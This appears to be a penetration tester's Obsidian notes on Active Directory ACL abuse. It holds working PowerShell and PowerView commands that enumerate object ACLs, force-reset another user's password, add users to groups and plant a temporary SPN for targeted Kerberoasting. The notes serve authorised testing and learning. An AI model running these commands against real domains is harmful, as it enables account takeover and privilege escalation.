```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
![[Active Directory#Access Control List (ACL)]]
![[Active Directory#Access Control Entries (ACEs)]]
![[Active Directory#Discretional ACL (DACL)]]
![[Active Directory#System ACL (SACL)]]

## Key ACEs that can be abused
- [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) : Gives us the right to reset a user's password without knowing their original password (*best to tell the client before resetting passwords - they could be used for other purposes too*).
- [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) : This gives us rights to change/write any non-protected attribute on an object. Eg. we could add ourselves to a group, add an SPN to another user so we can [[Kerberoasting|kerberoast]] them.
- [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) : Shows security groups that a user can add themselves too.
- [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) : Grants full control over a target object. If we have access to a computer that is using [[Windows#Local Administrator Password Solution (LAPS)|LAPS]] then we can get access to the password and obtain local administrator.
![[Pasted image 20250826144004.png]]
## ACL Enumeration
We can enumerate the ACLs of a domain/system to potentially gain further internal access. This can be done with [[Credentialed Enumeration#PowerView|PowerView]] and [[BloodHound]].
### Find all domain objects an SID controls
> this works for anything with an SID eg. users, groups, computers
```PowerShell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid [user]
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
> This gets all domain object ACLs, then matches the SecurityIdentifier field to the SID we provided.
> `-ResolveGUIDs` ensures that the ACL types are in a human readable formate rather than their GUIDs

> This command can take a bit of time, especially in large AD environments
#### Performing this without PowerView
> [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps)
> [Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2)

**Create a list of domain users**
```PowerShell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

**Get ACL information for each user**
```PowerShell
foreach($line in [System.IO.File]::ReadLines("<domain_users>")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\<target_user>'}}
```

**Manually resolve the ObjectType GUID**
```PowerShell
$guid = "<guid>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid} | fl
```

### Identifying nested group
If a group is nested in another group, any users in the sub-group will obtain the rights given by the parent group. This can lead to excessive rights for users.
```PowerShell
Get-DomainGroup -Identity "<group_name>" | select memberof
```

## Useful ACL Abuse Processes
### Creating a PSCredential Object for another user
If we aren't logged in as another user, then we can use PSCredential objects to use them as a context for a PowerShell session
```PowerShell
$SecPassword = ConvertTo-SecureString '[pass]' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('[domain]/[user]', $SecPassword)
```

### Force change another user's password
```PowerShell
# Create a SecureString object that will house the new password
$NewPassword = ConvertTo-SecureString '[new_pass]' -AsPlainText -Force

# Force change the user's password with PowerView
# We use the $Cred variable from above to use another user's context (this is optional if we are already logged in as that user)
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity [user] -AccountPassword $NewPassword -Credential $Cred -Verbose
```

### Add a user to a group
```PowerShell
# You can view all members of a group with this
Get-ADGroup -Identity "[group]" -Properties * | Select -ExpandProperty Members

# Add a user
Add-DomainGroupMember -Identity '[group]' -Members '[user]' -Credential $UserPSCredential -Verbose

# Remove a user
Remove-DomainGroupMember -Identity '[group]' -Members '[user]' -Credential $UserPSCredential -Verbose
```

### Updating a domain object
If we have permission to write to another user eg. `GenericAll`, then we can add a temporary fake SPN to a user, [[Kerberoasting|Kerberoast]] them, and potentially crack their password. This is useful as it means we aren't changing passwords and therefore potentially causing disruption.
```PowerShell
Set-DomainObject -Credential $Cred -Identity [target_user] -SET @{serviceprinciplename='temporary/PENTEST'} -Verbose

# We should also clean up the changed SPN
Set-DomainObject -Credential $Cred -Identity [target_user] -Clear serviceprinciplename -Verbose
```